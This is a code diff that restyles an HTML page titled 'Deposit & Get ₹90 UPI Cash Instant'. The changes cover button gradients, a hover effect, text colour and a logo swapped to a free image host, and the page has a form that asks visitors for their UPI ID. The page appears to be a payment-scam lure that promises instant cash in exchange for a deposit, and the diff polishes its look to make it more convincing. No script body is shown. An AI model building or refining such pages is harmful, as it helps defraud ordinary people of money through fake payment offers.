@@ -26,6 +26,7 @@
     img.logo {
       max-width: 120px;
       margin-bottom: 20px;
+      border-radius: 10px;
     }
     h2 {
       font-size: 22px;
@@ -42,24 +43,29 @@
     button {
       width: 100%;
       padding: 12px;
-      background: linear-gradient(to right, #ff416c, #6a5af9);
+      background: linear-gradient(to right, #ff416c, #ff4b2b);
       color: white;
       border: none;
       border-radius: 8px;
       font-size: 16px;
+      font-weight: bold;
       cursor: pointer;
+      transition: background 0.3s;
+    }
+    button:hover {
+      background: linear-gradient(to right, #ff4b2b, #ff416c);
     }
     .steps {
       margin-top: 20px;
       text-align: left;
-      color: #666;
+      color: #444;
       font-size: 14px;
     }
   </style>
 </head>
 <body>
   <div class="container">
-    <img src="https://i.postimg.cc/zXxj9mLb/xlogo.png" alt="Logo" class="logo" />
+    <img src="https://i.ibb.co/KdR0hS5/images.png" alt="Logo" class="logo" />
     <h2>Deposit & Get ₹90 UPI Cash Instant</h2>
     <form id="upiForm">
       <input type="text" id="upiId" name="upi" placeholder="Enter Your UPI ID" required />
@@ -109,4 +115,4 @@
     });
   </script>
 </body>
-  </html>
+</html>
